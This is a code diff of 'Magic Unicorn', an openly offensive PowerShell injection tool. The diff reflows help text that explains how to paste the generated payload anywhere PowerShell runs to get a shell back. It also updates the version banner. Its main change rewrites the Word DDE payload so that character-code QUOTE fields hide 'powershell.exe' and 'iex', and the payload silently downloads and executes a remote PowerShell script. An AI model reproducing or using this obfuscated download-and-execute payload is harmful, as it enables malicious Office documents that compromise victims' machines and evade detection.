@@ -158,14 +158,7 @@ def ps_help():
 
 				-----POWERSHELL ATTACK INSTRUCTIONS----
 
-Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains all
-of the code needed in order to inject the powershell attack into memory. Note you will need a place that
-supports remote command injection of some sort. Often times this could be through an excel/word  doc or
-through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to
-where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt
-window or where you have the ability to call the powershell executable and it will give a shell back to
-you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter
-payloads.
+Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads.
 
 Note that you will need to have a listener enabled in order to capture the attack.
 
@@ -255,7 +248,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v2.9.1 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v2.9.3 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -580,7 +573,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             # format for dde specific payload
             if attack_modifier == "dde":
                 full_attack = full_attack[11:] # remove powershell + 1 space
-                full_attack = ('DDEAUTO "C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe %s # " "Microsoft Document Security Add-On"' % (full_attack))
+                full_attack = ('''DDE "C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('ENTER_WEBURL_FOR_PS_HERE.ps1'); # " "Microsoft Document Security Add-On"''') # quote = WindowsPowerShell, powershell.exe, and iex
 
             write_file("powershell_attack.txt", full_attack)
             if attack_modifier != "dde":
